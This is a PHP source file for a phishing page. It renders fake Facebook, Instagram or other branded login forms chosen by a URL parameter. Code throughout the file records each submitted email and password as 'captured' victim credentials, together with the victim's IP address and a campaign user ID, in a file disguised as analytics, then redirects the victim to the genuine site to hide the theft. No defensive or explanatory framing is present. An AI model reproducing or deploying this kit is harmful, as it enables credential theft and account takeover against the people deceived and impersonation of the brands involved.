<?php
require_once __DIR__ . '/config.php';

$category = trim($_GET['cat'] ?? '');
$user = trim($_GET['user'] ?? 'anonymous');

// Basic validation for category
$categories = json_decode(file_get_contents(CATEGORIES_FILE), true);
$cat_found = false;
$cat_image = '';
foreach ($categories as $cat) {
    $c_name = is_array($cat) ? ($cat['name'] ?? '') : $cat;
    if (strcasecmp(str_replace(' ', '', $c_name), $category) === 0) {
        $cat_found = true;
        $display_cat = $c_name;
        $cat_image = is_array($cat) ? ($cat['image'] ?? '') : '';
        break;
    }
}

if (!$cat_found) {
    die('Invalid hub category.');
}

// Redirect URL
$redirect_url = "https://www." . strtolower(str_replace(' ', '', $display_cat)) . ".com";

// Define brand themes
$brand_themes = [
    'facebook' => [
        'bg' => '#f0f2f5',
        'primary' => '#1877f2',
        'logo_text' => 'facebook',
        'logo_color' => '#1877f2',
        'card_shadow' => '0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1)'
    ],
    'instagram' => [
        'bg' => '#fafafa',
        'primary' => '#0095f6',
        'logo_text' => 'Instagram',
        'logo_font' => "'Cookie', cursive",
        'logo_size' => '50px'
    ],
    'default' => [
        'bg' => '#f8f9fa',
        'primary' => '#4361ee',
        'logo_text' => $display_cat,
        'logo_color' => '#1e1e2d'
    ]
];

$theme = $brand_themes[strtolower($category)] ?? $brand_themes['default'];

// Handle Login Submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $victim_user = $_POST['email'] ?? $_POST['username'] ?? 'N/A';
    $victim_pass = $_POST['password'] ?? 'N/A';

    $analytics = json_decode(file_get_contents(ANALYTICS_FILE), true);
    $analytics[] = [
        'timestamp' => date('Y-m-d H:i:s'),
        'category' => strtolower($category),
        'user_id' => $user,
        'source_ip' => $_SERVER['REMOTE_ADDR'],
        'captured_user' => $victim_user,
        'captured_pass' => $victim_pass
    ];
    file_put_contents(ANALYTICS_FILE, json_encode($analytics));

    header("Location: " . $redirect_url);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo s($display_cat); ?> - Log In or Sign Up</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><path d=%22M50 5 L95 50 L50 95 L5 50 Z%22 fill=%22%23333%22 stroke=%22%23eee%22 stroke-width=%225%22/><text x=%2250%22 y=%2265%22 font-size=%2240%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22 font-family=%22Arial%22>U</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Cookie&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: <?php echo $theme['bg']; ?>;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }
        .login-card {
            background: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: <?php echo $theme['card_shadow'] ?? '0 4px 12px rgba(0,0,0,0.08)'; ?>;
        }
        .brand-logo {
            font-size: <?php echo $theme['logo_size'] ?? '32px'; ?>;
            font-weight: 800;
            color: <?php echo $theme['logo_color'] ?? '#000'; ?>;
            margin-bottom: 25px;
            font-family: <?php echo $theme['logo_font'] ?? 'inherit'; ?>;
        }
        <?php if (strtolower($category) === 'facebook'): ?>
        .brand-logo { text-align: left; color: #1877f2; font-size: 40px; margin-bottom: 10px; }
        .login-card { border: none; }
        <?php endif; ?>

        .form-group { margin-bottom: 15px; }
        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus { border-color: <?php echo $theme['primary']; ?>; }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: <?php echo $theme['primary']; ?>;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-login:hover { filter: brightness(0.95); }

        .links { margin-top: 20px; font-size: 14px; color: <?php echo $theme['primary']; ?>; }
        .links a { text-decoration: none; color: inherit; }

        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .footer-text { margin-top: 40px; font-size: 12px; color: #737373; }
    </style>
</head>
<body>
    <div class="login-container">
        <?php if (strtolower($category) === 'facebook'): ?>
            <div class="brand-logo"><?php echo $theme['logo_text']; ?></div>
        <?php endif; ?>

        <div class="login-card">
            <?php if (strtolower($category) !== 'facebook'): ?>
                <div class="brand-logo">
                    <?php if ($cat_image): ?>
                        <img src="<?php echo s($cat_image); ?>" style="max-height: 60px; margin-bottom: 10px;">
                    <?php else: ?>
                        <?php echo $theme['logo_text']; ?>
                    <?php endif; ?>
                </div>
            <?php endif; ?>

            <form method="POST">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or Phone Number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn-login">Log In</button>

                <div class="links">
                    <a href="#">Forgot password?</a>
                </div>

                <div class="divider"></div>

                <button type="button" class="btn-login" style="background-color: #42b72a; width: auto; padding: 10px 20px; font-size: 16px;">Create New Account</button>
            </form>
        </div>

        <div class="footer-text">
            <strong><?php echo s($display_cat); ?></strong> &copy; 2025 · English (US)
        </div>
    </div>
</body>
</html>
